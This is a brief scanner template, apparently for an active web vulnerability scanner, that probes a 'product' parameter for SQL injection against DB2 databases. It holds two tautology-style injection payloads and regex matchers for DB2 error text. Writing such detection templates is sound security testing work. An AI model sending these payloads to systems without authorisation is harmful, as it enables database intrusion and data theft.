id: sqli6-db2-28
name: 'SQLi db2 probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - '1''||''1''=''1'
        - '" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
